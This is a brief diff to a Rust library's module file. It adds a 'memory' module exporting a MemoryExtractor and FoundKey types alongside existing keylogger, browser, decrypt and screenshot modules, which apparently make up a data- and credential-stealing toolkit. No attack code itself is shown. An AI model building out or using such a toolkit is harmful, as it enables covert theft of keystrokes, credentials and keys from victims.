@@ -3,6 +3,7 @@ pub mod browser;
 pub mod decrypt;
 pub mod errors;
 pub mod keylogger;
+pub mod memory;
 pub mod screenshot;
 pub mod system;
 pub mod types;
@@ -21,6 +22,9 @@ pub use errors::ExtractionError;
 pub use keylogger::{
     get_key_state, KeyEvent, KeyEventType, KeyloggerConfig, KeyloggerModule, KeyloggerState,
     SpecialKey,
+};
+pub use memory::{
+    Confidence, FoundKey, MemoryExtractionResult, MemoryExtractor, ProcessInfo,
 };
 pub use screenshot::{take_screenshot, ImageFormat, Screenshot, ScreenshotConfig, ScreenshotModule};
 pub use system::SystemExtractor;
